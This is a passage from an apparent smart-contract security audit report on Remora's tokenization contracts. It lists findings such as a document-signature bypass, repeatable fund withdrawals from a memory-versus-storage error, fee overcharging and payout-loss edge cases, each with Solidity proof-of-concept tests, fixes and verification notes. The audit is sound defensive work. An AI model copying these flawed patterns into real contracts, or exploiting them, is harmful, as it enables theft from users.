**Remora:** Fixed in commits [a0b277f](https://github.com/remora-projects/remora-smart-contracts/commit/a0b277fe4a59354f3b3783c4b8c06eb60f5157610), [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5).

**Cyfrin:** Verified.


### `PaymentSettler` can change `stablecoin` but `RemoraToken` can't resulting in corrupted state with DoS for core functions

**Description:** `RemoraToken` has a `stablecoin` member with a comment that indicates it must match `PaymentSettler`:
```solidity
address public stablecoin; //make sure same stablecoin is used here that is used in payment settler
```

But in the updated code there is no way to update `RemoraToken::stablecoin`; previously `DividendManager` which `RemoraToken` inherits from had a `changeStablecoin` function but this was commented out with the introduction of `PaymentSettler`.

`PaymentSettler` has a `stablecoin` member and a function to change it:
```solidity
address public stablecoin;

function changeStablecoin(address newStablecoin) external restricted {
    if (newStablecoin == address(0)) revert InvalidAddress();
    stablecoin = newStablecoin;
}
```

**Impact:** When `PaymentSettler` changes its `stablecoin` it will now be different to `RemoraToken::stablecoin` which can't be changed, corrupting the state causing key functions to revert.

**Proof Of Concept:**
```solidity
function test_changeStablecoin_inconsistentState() external {
    address newStableCoin = address(new Stablecoin("USDC", "USDC", 0, 6));

    // change stablecoin on PaymentSettler
    paySettlerProxy.changeStablecoin(newStableCoin);
    assertEq(paySettlerProxy.stablecoin(), newStableCoin);

    // now inconsistent with RemoraToken
    assertEq(remoraTokenProxy.stablecoin(), address(stableCoin));
    assertNotEq(paySettlerProxy.stablecoin(), remoraTokenProxy.stablecoin());

    // no way to update RemoraToken::stablecoin
}
```

**Recommended Mitigation:** Enforce that `RemoraToken` and `PaymentSettler` must always refer to the same `stablecoin`. When implementing this consider our other findings where changing the `stablecoin` to one with different decimals corrupts protocol accounting.

The simplest solution may be to remove `stablecoin` from `RemoraToken` completely and have `PaymentSettler` perform all the necessary transfers.

**Remora:** Fixed in commit [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5) by removing `stablecoin` from `RemoraToken`, moving the transfer fee logic into `PaymentSettler` and having `RemoraToken` call `PaymentSettler::settleTransferFee`.

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### `PledgeManager::refundTokens` doesn't decrement `tokensSold` when pledge hasn't concluded, preventing pledge from reaching its funding goal

**Description:** `PledgeManager::refundTokens` doesn't decrement `tokensSold` when pledge hasn't concluded.

**Impact:** The pledge will be prevented from reaching its funding goal since the refunded tokens can't be purchased by other users.

**Recommended Mitigation:** `PledgeManager::refundTokens` should always decrement `tokensSold`:
```diff
        if (
            !pledgeRoundConcluded &&
            SafeCast.toUint32(block.timestamp) < deadline
        ) {
            refundAmount -= (refundAmount * earlySellPenalty) / 1e6;
            _propertyToken.adminTransferFrom(
                signer,
                holderWallet,
                numTokens,
                false,
                false
            );
            emit TokensUnPledged(signer, numTokens);
        } else {
            fee = (userPay.fee / userPay.tokensBought) * numTokens;
            _propertyToken.burnFrom(signer, numTokens);
            emit TokensRefunded(signer, numTokens);
-           tokensSold -= numTokens;
        }

+      tokensSold -= numTokens;
```

**Remora:** Fixed in commit [6be4660](https://github.com/remora-projects/remora-smart-contracts/commit/6be4660990ebafbb7200425978f078a0865732fe).

**Cyfrin:** Verified.


### `TokenBank::withdrawFunds` resets `memory` not `storage` fee and sale amounts allowing multiple withdraws for the same token

**Description:** `TokenBank::withdrawFunds` resets `memory` not `storage` fee and sale amounts allowing multiple withdraws for the same token:
```solidity
    function withdrawFunds(
        address tokenAddress,
        bool fee
    ) public nonReentrant restricted {
        TokenData memory curData = tokenData[tokenAddress];
        address to;
        uint64 amount;
        if (fee) {
            to = custodialWallet;
            amount = curData.feeAmount;
            curData.feeAmount = 0; // @audit resets memory not storage
        } else {
            to = curData.withdrawTo;
            amount = curData.saleAmount;
            curData.saleAmount = 0; // @audit resets memory not storage
        }
        if (amount != 0) IERC20(stablecoin).transfer(to, amount);

        if (fee) emit FeesClaimed(tokenAddress, amount);
        else emit FundsClaimed(tokenAddress, amount);
    }
```

**Impact:** The admin can make multiple fee and sale amount withdraws for the same token address. This will work as long as there are sufficient fee and sale tokens from other sales.

**Recommended Mitigation:** Reset `storage` not `memory`:
```diff
    function withdrawFunds(
        address tokenAddress,
        bool fee
    ) public nonReentrant restricted {
        TokenData memory curData = tokenData[tokenAddress];
        address to;
        uint64 amount;
        if (fee) {
            to = custodialWallet;
            amount = curData.feeAmount;
-           curData.feeAmount = 0;
+           tokenData[tokenAddress].feeAmount = 0;
        } else {
            to = curData.withdrawTo;
            amount = curData.saleAmount;
-           curData.saleAmount = 0;
+           tokenData[tokenAddress].saleAmount = 0;
        }
        if (amount != 0) IERC20(stablecoin).transfer(to, amount);

        if (fee) emit FeesClaimed(tokenAddress, amount);
        else emit FundsClaimed(tokenAddress, amount);
    }
```

**Remora:** Fixed in commit [571bfe4](https://github.com/remora-projects/remora-smart-contracts/commit/571bfe4b3129d1acaee62e323a3165c7b1c0f3d1).

**Cyfrin:** Verified.


### Fee should be calculated after first purchase discount is applied in `TokenBank::buy` to prevent over-charging users

**Description:** `TokenBank::buy` calculates the total purchase amount as being composed of:
* `stablecoinValue` : value of the tokens
* `feeValue` : fee calculated off `stablecoinValue`
```solidity
        uint64 stablecoinValue = amount * curData.pricePerToken;
        uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;
```

Afterwards if this is the user's first purchase, they receive a discount on the `stablecoinValue`:
```solidity
        IReferralManager refManager = IReferralManager(referralManager);
        bool firstPurchase = refManager.isFirstPurchase(to);
        if (firstPurchase) stablecoinValue -= refManager.referDiscount();
```

However the fee is not updated so was still calculated from the initial higher `stablecoinValue` amount.

**Impact:** Users will pay higher fees than they should when receiving the first purchase discount.

**Recommended Mitigation:** Only calculate `feeValue` once the discount has been applied:
```diff
        address to = msg.sender;
        uint64 stablecoinValue = amount * curData.pricePerToken;
-       uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;

        IReferralManager refManager = IReferralManager(referralManager);
        bool firstPurchase = refManager.isFirstPurchase(to);
        if (firstPurchase) stablecoinValue -= refManager.referDiscount();

+       uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;
        curData.saleAmount += stablecoinValue;
        curData.feeAmount += feeValue;
```

**Remora:** Fixed in commits [4aea246](https://github.com/remora-projects/remora-smart-contracts/commit/4aea246c8de4dcd03bc11a5cd87ca617e787bdaf), [5510920](https://github.com/remora-projects/remora-smart-contracts/commit/55109201b0b592abb94a3c73a5f45c9c24b3d440) - changed the way fee calculation works for regulatory reasons.

**Cyfrin:** Verified.


### Buyers can pledge for tokens without having signed all documents that are required to be signed

**Description:** When buyers pledge() during the pledgeRound, it is verified that they [have signed all the documents](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/PledgeManager.sol#L316) that are required to be signed.
If at least one document is not signed, instead of reverting the tx, the execution will [verify a signature on behalf of the signer](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/PledgeManager.sol#L317-L322), and, if this signature is legit, the execution continues.

```solidity
    function _verifyDocumentSignature(
        PledgeData calldata data,
        address signer
    ) internal {
        (bool res, ) = IRemoraRWAToken(propertyToken).hasSignedDocs(signer);
        if (!res)
            IRemoraRWAToken(propertyToken).verifySignature(
                signer,
                data.docHash,
                data.signature
            );
    }
```

**The problem is** that this implementation allows buyers to bypass the requirement to have signed all the documents by signing only one. For example:
There are 3 documents that need to be signed, and the user has not signed any of them. The user calls pledge() and provides the signature's data to sign 1 document. Here is what will happen:

[PropertyToken::hasSignedDocs() ](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DocumentManager.sol#L114-L127) will return false because the user has not signed any of the 3 documents
```solidity
    function hasSignedDocs(address signer) public view returns (bool, bytes32) {
        ...

        for (uint256 i = 0; i < numDocs; ++i) {
            bytes32 docHash = $._docHashes[i];
//@audit => If one document that needs signature is not signed, returns false
            if (
                $._documents[docHash].needSignature &&
                $._signatureRecords[signer][docHash] == 0
            ) return (false, docHash);
        }

//@audit => returns true only if all documents that requires signature are signed
        return (true, 0x0);
    }
```

[PropertyToken::verifySignature()](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DocumentManager.sol#L148-L184) won't revert because it will sign one of the 3 documents
```solidity
    function verifySignature(
        address signer,
        bytes32 docHash,
        bytes memory signature
    ) external returns (bool result) {
        ...
        if (signer.code.length == 0) {
            //signer is EOA
            (address returnedSigner, , ) = ECDSA.tryRecover(digest, signature);
            result = returnedSigner == signer;
        } else {
            //signer is SCA
            (bool success, bytes memory ret) = signer.staticcall(
                ...
            );
            result = (success && ret.length == 32 && bytes4(ret) == MAGICVALUE);
        }

        if (!result) revert InvalidSignature();
        if ($._signatureRecords[signer][docHash] == 0) {
           ...
        }
//@audit => if the verification of the provided signature succeeds, execution continues
    }
```

**The problem is** that the execution will continue even though the user has only signed 1 of the 3 documents that have to be signed because (as previously explained), [_verifyDocumentSignature()](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/PledgeManager.sol#L312-L323) will be bypassed to only enforce one signature, and, when transferring from the holderWallet to the signer, the [`checkTC` is set as false](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/PledgeManager.sol#L207).

[PledgeManager::pledge()](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/PledgeManager.sol#L167-L221)
```solidity
    function pledge(PledgeData calldata data) external nonReentrant {
        ...

        _verifyDocumentSignature(data, signer);

       ...

//@audit => checkTC is set as false
        //this address should be whitelisted in property token
        IRemoraRWAToken(propertyToken).adminTransferFrom(
            holderWallet,
            signer,
            numTokens,
            false,  // <====> checkTC //
            true
        );
       ...
    }
```

[RemoraToken::adminTransferFrom()](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/RemoraToken.sol#L228-L252)
```solidity
    function adminTransferFrom(
        address from,
        address to,
        uint256 value,
        bool checkTC,
        bool enforceLock
    ) external restricted returns (bool) {
       ...
//@audit => checkTC as false effectively bypass the verification of TC to be signed
        (bool res, ) = hasSignedDocs(to);
        if (checkTC && !res) revert TermsAndConditionsNotSigned(to);

       ...
    }

```


**Impact:** Buyers can purchase tokens even though they have not signed all the documents that have to be signed

**Recommended Mitigation:** Revert the execution if the call to `PropertyToken.hasSignedDocs()` returns false.

```diff
function _verifyDocumentSignature(
        PledgeData calldata data,
        address signer
    ) internal {

        (bool res, ) = IRemoraRWAToken(propertyToken).hasSignedDocs(signer);

-      if (!res)
-          IRemoraRWAToken(propertyToken).verifySignature(
-             signer,
-             data.docHash,
-              data.signature
-         );

+     if (!res) revert NotAllDocumentsAreSigned();

    }
```

**Remora:** Fixed in commit [5510920](https://github.com/remora-projects/remora-smart-contracts/commit/55109201b0b592abb94a3c73a5f45c9c24b3d440#diff-7ce9b56302de46e809d6a2bc534817c3a4ea314d0e16d299fae932f057245486L193-R191).

**Cyfrin:** Verified.


### Hardcoding deadline for `permit()` will mess up the `structHash` leading to an invalid signature

**Description:** Functions allowing users to grant ERC20 approvals via Permit incorrectly hardcode the deadline passed to permit().
```solidity
function pledge(PledgeData calldata data) external nonReentrant {
        ...

        //5 minute deadline
        if (data.usePermit) {
            IERC20Permit(stablecoin).permit(
                signer,
                address(this),
                finalStablecoinAmount,
//@audit-issue => hardcoded deadline
                block.timestamp + 300,
                data.permitV,
                data.permitR,
                data.permitS
            );
        }
        ...
}
```
The problem is that the recovered signature will be invalid because the deadline is a parameter of the structHash, and, if the signed deadline differs even by 1 second, that hashed structHash will be different than the one that was actually signed by the user.

```solidity
function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

//@audit-issue => A hardcoded deadline will mess up the structHash
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

//@audit-issue => A different hash than the actual hash signed by the signer will recover a != signer (even address(0)
        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }
```

**Impact:** Functions like `pledge()`, `refundToken()` that allows to authorize ERC20Tokens via permit won't work because the structHash will be different than the actual hash signed by the user.

**Recommended Mitigation:** Receive the deadline as a parameter instead of hardcoding it.

```diff
function pledge(PledgeData calldata data) external nonReentrant {
        ...

        //5 minute deadline
        if (data.usePermit) {
            IERC20Permit(stablecoin).permit(
                signer,
                address(this),
                finalStablecoinAmount,
-              block.timestamp + 300,
+              data.deadline,
                data.permitV,
                data.permitR,
                data.permitS
            );
        }
        ...
}
```

**Remora:** Fixed in [5510920](https://github.com/remora-projects/remora-smart-contracts/commit/55109201b0b592abb94a3c73a5f45c9c24b3d440) by removing the permit functionality.

**Cyfrin:** Verified.


### `DocumentManager::hasSignedDocs` incorrectly returns `true` when there are no documents to sign

**Description:** `DocumentManager::hasSignedDocs` incorrectly returns `true` when there are no documents to sign:
```solidity
function hasSignedDocs(address signer) public view returns (bool, bytes32) {
    DocumentStorage storage $ = _getDocumentStorage();
    uint256 numDocs = $._docHashes.length;

    // @audit when numDocs = 0, the `for` loop is bypassed
    // skipping to the `return (true, 0x0);` statement
    for (uint256 i = 0; i < numDocs; ++i) {
        bytes32 docHash = $._docHashes[i];
        if (
            $._documents[docHash].needSignature &&
            $._signatureRecords[signer][docHash] == 0
        ) return (false, docHash);
    }

    return (true, 0x0);
}
```

**Impact:** Upstream contracts incorrectly assume users have signed docs and allow user actions which should be prohibited.

**Proof Of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {DocumentManager} from "../../../contracts/RWAToken/DocumentManager.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

contract DocumentManagerTest is UnitTestBase, DocumentManager {
    function setUp() public override {
        UnitTestBase.setUp();
        initialize();
    }

    function initialize() public initializer {
        __RemoraDocuments_init("NAME", "VERSION");
    }

    // this is incorrect and should be changed once bug is fixed
    function test_hasSignedDocs_TrueWhenNoDocs() external {
        // verify no docs
        assertEq(_getDocumentStorage()._docHashes.length, 0);

        // hasSignedDocs returns true even though no docs to sign
        (bool hasSigned, ) = hasSignedDocs(address(0x1337));
        assertTrue(hasSigned);
    }
}
```

**Recommended Mitigation:** When no docs exist, it is impossible for users to have signed them. Hence in this case `DocumentManager::hasSignedDocs` should either revert with a specific error such as `EmptyDocument` or `return (false, 0x0)`.

**Remora:** Fixed in commit [7454e55](https://github.com/remora-projects/remora-smart-contracts/commit/7454e55e4017aab9d286637fbe5ccf3c705324ba).

**Cyfrin:** Verified.


### Don't add duplicate `documentHash` to `DocumentManager::DocumentStorage::_docHashes` when overwriting via `_setDocument` as this causes panic revert when calling `_removeDocument`

**Description:** `DocumentManager::_setDocument` intentionally allows overwriting but when overwriting it adds an additional duplicate `documentHash` to `_docHashes`:
```solidity
function _setDocument(
    bytes32 documentName,
    string calldata uri,
    bytes32 documentHash,
    bool needSignature
) internal {
    DocumentStorage storage $ = _getDocumentStorage();
    $._documents[documentHash] = DocData({
        needSignature: needSignature,
        docURI: uri,
        docName: documentName,
        timestamp: SafeCast.toUint32(block.timestamp)
    });

    // @audit duplicate if overwriting
    $._docHashes.push(documentHash);
    emit DocumentUpdated(documentName, uri, documentHash);
}
```

**Impact:** Once the hash has been duplicated in `_docHashes`, it is impossible to remove the document by calling `_removeDocument` as it panic reverts.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {DocumentManager} from "../../../contracts/RWAToken/DocumentManager.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

contract DocumentManagerTest is UnitTestBase, DocumentManager {
    function setUp() public override {
        UnitTestBase.setUp();
        initialize();
    }

    function initialize() public initializer {
        __RemoraDocuments_init("NAME", "VERSION");
    }

    // this is incorrect and should be changed once bug is fixed
    function test_setDocumentOverwrite(string calldata uri) external {
        bytes32 docName = "0x01234";
        bytes32 docHash = "0x5555";
        bool needSignature = true;

        // add the document
        _setDocument(docName, uri, docHash, needSignature);

        // verify its hash has been added to `_docHashes`
        DocumentStorage storage $ = _getDocumentStorage();
        assertEq($._docHashes.length, 1);
        assertEq($._docHashes[0], docHash);

        // ovewrite it
        _setDocument(docName, uri, docHash, needSignature);
        // this duplicates the hash in `_docHashes`
        assertEq($._docHashes.length, 2);
        assertEq($._docHashes[0], docHash);
        assertEq($._docHashes[1], docHash);

        // now attempt to remove it, reverts with
        // panic: array out-of-bounds access
        _removeDocument(docHash);
    }
}
```

**Recommended Mitigation:** In `DocumentManager::_setDocument` check if the `documentHash` already exists and if so, don't add it to `_docHashes`.

Alternatively use [`EnumerableSet`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol) for `DocumentManager::DocumentStorage::_docHashes` which doesn't allow duplicates.

In `_removeDocument` break out of the loop once the element has been deleted:
```diff
        uint256 dHLen = $._docHashes.length;
        for (uint i = 0; i < dHLen; ++i) {
            if ($._docHashes[i] == documentHash) {
                $._docHashes[i] = $._docHashes[dHLen - 1];
                $._docHashes.pop();
+               break;
            }
        }
```

**Remora:** Fixed in commit [1218d18](https://github.com/remora-projects/remora-smart-contracts/commit/1218d1818e1748cd7d9b71e84485f8059d135ab5).

**Cyfrin:** Verified.


### Check return value when calling `Allowlist::exchangeAllowed` and `RemoraToken::_exchangeAllowed` to prevent unauthorized transfers

**Description:** `Allowlist::exchangeAllowed` will revert if the users are not allowed but when the users are both allowed, it will return a boolean determined by whether the `domestic` field of both users match:
```solidity
function exchangeAllowed(
    address from,
    address to
) external view returns (bool) {
    HolderInfo memory fromUser = _allowed[from];
    HolderInfo memory toUser = _allowed[to];
    if (from != address(0) && !fromUser.allowed)
        revert UserNotRegistered(from);
    if (to != address(0) && !toUser.allowed) revert UserNotRegistered(to);
    return fromUser.domestic == toUser.domestic; //logic to be edited later on
}
```

But `RemoraToken::adminTransferFrom` doesn't check the boolean return when calling `Allowlist::exchangeAllowed`:
```solidity
function adminTransferFrom(
    address from,
    address to,
    uint256 value,
    bool checkTC,
    bool enforceLock
) external restricted returns (bool) {
    // @audit boolean return not checked
    IAllowlist(allowlist).exchangeAllowed(from, to);
```

Similary `RemoraToken::_exchangeAllowed` returns the boolean output of `Allowlist::exchangeAllowed`, but this is never checked in `RemoraToken::transfer`, `transferFrom`.

**Impact:** Transfers are allowed even when `Allowlist::exchangeAllowed` returns `false`.

**Recommended Mitigation:** Check the boolean return of `Allowlist::exchangeAllowed`, `RemoraToken::_exchangeAllowed` and only allow transfers when they return `true`.

Alternatively change `Allowlist::exchangeAllowed` and `RemoraToken::_exchangeAllowed` to not return anything but to always revert.

**Remora:** Fixed in commit [13cf261](https://github.com/remora-projects/remora-smart-contracts/commit/13cf261d37f5756cac480aa1e0c8ecf756fd3af5).

**Cyfrin:** Verified.


### `DividendManager::distributePayout` will always revert after 255 payouts, preventing any future payout distributions

**Description:** `DividendManager::HolderManagementStorage::_currentPayoutIndex` is declared as `uint8`:
```solidity
/// @dev The current index that is yet to be paid out.
uint8 _currentPayoutIndex;
```

`_currentPayoutIndex` is incremented every time `DividendManager::distributePayout` is called:
```solidity
$._payouts[$._currentPayoutIndex++] = PayoutInfo({
    amount: payoutAmount,
    totalSupply: SafeCast.toUint128(totalSupply())
});
```

**Impact:** The maximum value of `uint8` is 255 so `DividendManager::distributePayout` can only be called 255 times; any further calls will always revert meaning no more payout distributions are possible.

**Recommended Mitigation:** If requiring more than 255 payout distributions:
* use a larger size to store `DividendManager::HolderManagementStorage::_currentPayoutIndex`
* change the `uint8` key in this mapping to match the larger size:
```solidity
mapping(address => mapping(uint8 => TokenBalanceChange)) _balanceHistory;
```
* change the `uint256` key in this mapping to match:
```solidity
mapping(uint256 => PayoutInfo) _payouts;
```

Consider using named mappings to explicitly show that these indexes all refer to the same entity, the payout index.

In Solidity a storage slot is 256 bits and an address uses 160 bits. Examining the relevant storage layout of `struct HolderManagementStorage` shows that `_currentPayoutIndex` could be declared as large as `uint56` without using any additional storage slots:
```solidity
IERC20 _stablecoin; // 160 bits
uint8 _stablecoinDecimals; // 8 bits
uint32 _payoutFee; // 32 bits
// 200 bits have been used so 56 bits available in the current storage slot
// _currentPayoutIndex could be declared as large as `uint56` with no
// extra storage requirements
uint8 _currentPayoutIndex;
```

**Remora:** Fixed in commit [f929ff1](https://github.com/remora-projects/remora-smart-contracts/commit/f929ff115f82e76c8eb497ce769792e8de99602b#diff-b6e3759e2288f06f4db11f44b35e7a6398f0301035472704a0479aab4afd9b48R62) by increasing `_currentPayoutIndex` to `uint16` which will be sufficient.

**Cyfrin:** Verified.


### Payout distributions to Remora token holders are diluted by initial token owner mint

**Description:** `RemoraToken::initialize` takes a parameter `_initialSupply` and mints this to `tokenOwner`:
```solidity
_mint(tokenOwner, _initialSupply * 10 ** decimals());
```

`DividendManager::distributePayout` records the payout amount together with the current total supply:
```solidity
$._payouts[$._currentPayoutIndex++] = PayoutInfo({
    amount: payoutAmount,
    totalSupply: SafeCast.toUint128(totalSupply())
});
```

`DividendManager::payoutBalance` calculates user payout amount dividing by the recorded total supply:
```solidity
payoutAmount +=
    (curEntry.tokenBalance * pInfo.amount) /
    pInfo.totalSupply;
```

**Impact:** Payout distributions for Remora token holders are diluted by the initial token owner mint. If the token owner is minted a significant percentage of the supply, normal users will have their rewards significantly diluted.

**Recommended Mitigation:** Exclude the token owner's tokens from the payout distribution by subtracting them from the total supply. The token owner could get around this though by transferring their tokens to other addresses the control.

Another way is to have a variable in `RemoraToken` which only the admin can set that records the amount of tokens the owner holds, and this gets subtracted from the total supply for purposes of payout distribution. The owner would need to update this variable so there is still trust required in the owner.

Alternatively the finding can be acknowledged as long as the protocol is aware that users will have their rewards diluted by the owner's holdings.

**Remora:** The plan is to send all of the initial token mint to the `TokenBank`; the intended `tokenOwner` is actually the token bank. These tokens then go on sale for the investors so the protocol admin won't hold any tokens themselves; the tokens will either be in the token bank awaiting sale or with the investors who bought them.

Unsold tokens held by `TokenBank` are owned by the protocol; we will use the forwarding mechanism to claim our share of the payout distributions for unsold tokens still held by the token bank.


### Burning ALL PropertyTokens of a frozen holder results in the holder losing the payouts distribution while he was frozen

**Description:** Burning PropertyTokens from frozen holders has an edge case when all the tokens owned by a frozen holder get burned. This is how burning PropertyTokens impacts the payouts for distributions of frozen holders:
- If not all the PropertyTokens owned by a frozen holder are burned, the holder can still have access to the payouts for the distributions while he was frozen.
- If all the PropertyTokens owned by a frozen holder are burned, the holder would lose the payouts for the distributions while he was frozen.

The discrepancy in the behavior when burning PropertyTokens of Frozen Holders demonstrates an edge case that can result in frozen holders losing payouts.

For example - (Assume holders were frozen at the same index and got their tokens burned at the same index too):
- UserA has 1 PropertyToken and is frozen
- UserB has 2 PropertyTokens and is frozen too
- UserA and B get burned each a PropertyToken.
  - UserA loses the payouts distributions while he was frozen, whilst UserB still has access to the payouts for the 2 PropertyTokens that he owned during those distributions.

**Impact:** Burning ALL the PropertyTokens owned by a frozen holder causes the holder to lose the payouts for the distributions while he was frozen.

**Proof of Concept:** Run the following test to reproduce the issue described on the Description section
```solidity
    function test_frozenHolderLosesPayoutsBecauseItsTokensGotBurnt() public {
        address user1 = users[0];
        uint256 amountToMint = 2;

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        _whitelistAndMintTokensToUser(user1, amountToMint);

        vm.prank(user1);
        remoraTokenProxy.approve(address(this), amountToMint);

        paySettlerProxy.initiateBurning(address(remoraTokenProxy), address(this), 0);

        // verify increased current payout index twice
        assertEq(remoraTokenProxy.getCurrentPayoutIndex(), 5);

        // Distribute payouts for distributions 5 - 10
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // Freze user 2 at distributionIndex 10
        remoraTokenProxy.freezeHolder(user1);

        uint256 user1HolderBalanceAfterBeingFrozen = remoraTokenProxy.payoutBalance(user1);

        // Distribute payouts for distributions 10 - 15
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // verify increased current payout index twice
        assertEq(remoraTokenProxy.getCurrentPayoutIndex(), 15);

        assertEq(user1HolderBalanceAfterBeingFrozen, remoraTokenProxy.payoutBalance(user1), "Frozen holder earned payout while being frozen");

        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        // 5 distributions of 100e6 all for user1
        assertEq(user1PayoutBalance, 500e6, "User1 Payout is incorrect");

        vm.prank(user1);
        remoraTokenProxy.claimPayout();
        assertEq(stableCoin.balanceOf(user1), user1PayoutBalance, "Error while claiming payout");
        assertEq(remoraTokenProxy.payoutBalance(user1), 0);

        //@audit-info => When the holder is unfrozen, he gets access to the payouts for al the distributions while he was frozen
        uint256 snapshotBeforeUnfreezing = vm.snapshotState();
        // unfreeze user1 and validate it gets access to all the distributions while it was frozen
        remoraTokenProxy.unFreezeHolder(user1);
        // After being unfrozen there were pending only 5 distributions of 100e6 all for user1
        assertEq(remoraTokenProxy.payoutBalance(user1), 500e6, "User1 Payout is incorrect");
        vm.revertToState(snapshotBeforeUnfreezing);

        uint256 snapshotBeforeBurningAllFrozenHolderTokens = vm.snapshotState();
        //@audit-info => Burning ALL PropertyTokens from a holder while is frozen results in the holder
        // NOT being able to access the payouts of the distributions while he was frozen
        remoraTokenProxy.burnFrom(user1, 2, false);
        assertEq(remoraTokenProxy.balanceOf(user1), 0);

        assertEq(remoraTokenProxy.payoutBalance(user1), 0);
        // unfreeze user1 and validate it loses the payouts of the distributions while it was frozen
        remoraTokenProxy.unFreezeHolder(user1);
        assertEq(remoraTokenProxy.payoutBalance(user1), 0);
        vm.revertToState(snapshotBeforeBurningAllFrozenHolderTokens);

        //@audit-info => Burning NOT ALL PropertyTokens from a holder while is frozen results in the holder
        // being able to access the payouts of the distributions while he was frozen
        assertEq(remoraTokenProxy.payoutBalance(user1), 0);
        remoraTokenProxy.burnFrom(user1, 1, false);
        assertEq(remoraTokenProxy.balanceOf(user1), 1);
        remoraTokenProxy.unFreezeHolder(user1);
        assertEq(remoraTokenProxy.payoutBalance(user1), 500e6);
    }
```

**Recommended Mitigation:** The least disruptive mitigation to prevent this issue is to add a check on the `burnFrom` to revert the tx if the account has been left without more propertyTokens and the account is frozen
```diff
function burnFrom(
        address account,
        uint256 value
    ) external restricted whenBurnable {
        _spendAllowance(account, _msgSender(), value);
        _burn(account, value);
+      if(balanceOf(account) == 0 && isHolderFrozen(account)) revert UserIsFrozen(account);
    }
```
Alternatively, similar to the burn(), revert if the account if frozen.
```diff
    function burnFrom(
        address account,
        uint256 value
    ) external restricted whenBurnable {
+       if (isHolderFrozen(account)) revert UserIsFrozen(account);
        _spendAllowance(account, _msgSender(), value);
        _burn(account, value);
    }
```

**Remora:** Fixed in commit [6008aec](https://github.com/remora-projects/remora-smart-contracts/commit/6008aecffdd83311e4552e8efee42eae59b3cd30) by preventing burning on frozen users.

**Cyfrin:** Verified.


### Overriding fees can't be switched back once set

**Description:** A fee is charged when buying a PropertyToken via the TokenBank. The system allows for charging a personalized fee on a per-token basis or a baseFee for all tokens.
If the variable `overrideFees` is set as true, the TokenBank will charge the baseFee that is charged to all tokens instead of charging the configured per-token fee.

The problem is that once the `overrideFees` variable is set to true, it is not possible to set it back to false to allow charging fees on a per-token basis.

```solidity
    function setBaseFee(
        bool updateFee,
        bool overrideFee,
        uint32 newFee
    ) external restricted {
        ...
//@audit => enters only when it is true.
//@audit => So, once set to true, it can't be changed back to false
        if (overrideFee) {
            overrideFees = overrideFee;
            emit FeeOverride(overrideFee);
        }
    }

```

**Impact:** Not possible to charge fees on a per-token basis once it has been configured to charge the baseFee.

**Recommended Mitigation:** Directly update `overrideFees` with the value of the parameter `overrideFee`.
```diff
    function setBaseFee(
        bool updateFee,
        bool overrideFee,
        uint32 newFee
    ) external restricted {
        ...
-       if (overrideFee) {
            overrideFees = overrideFee;
            emit FeeOverride(overrideFee);
-       }
    }
```

**Remora:** Fixed in commit [c38787f](https://github.com/remora-projects/remora-smart-contracts/commit/c38787f4cfd8272868bc939e73ee3d3d50889740).

**Cyfrin:** Verified.


### Forwarders can lose payouts of the holders forwarding to them

**Description:** A holder can have a designated forwarder who will accumulate the payouts earned by the holder.
The vulnerability identified in this report is when the designated forwarder has no pending payouts to claim and zeroes out his PropertyToken's balance, and, time passes (while forwarder is still accumulating the payouts of the holder) and then it becomes a holder again, but on the same distributionIndex the forwarder zeroes out his balance again.
- The combination of these steps leads the contract's state to an inconsistent state that ends up causing the unclaimed accumulated payouts to be lost.

The steps that lead the contracts to the inconsistent state are:
1. forwarder has balance, it is a holder
2. holder sets a forwarder
3. payouts for holder are computed and credited to forwarder
4. forwarder claims payouts, and gets computed all pending payouts
    - At this point, payoutBalance of forwarder would be 0
5. forwarder zeros out his balance, and [gets removed the `isHolder` status (no longer a holder)](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L596-L600)
6. distributions passes
7. payouts for holder are computed and credited to the forwarder
8. forwarder gets a balance and regains holder status
    - [lastPayoutIndexCalculated = currentPayoutIndex](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L523-L525)
10. forwarder zeros out his balance again
    - payoutBalance(forwarder) is called but returns 0 because [`lastPayoutIndexCalculated == currentPayoutIndex`](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L450-L454)
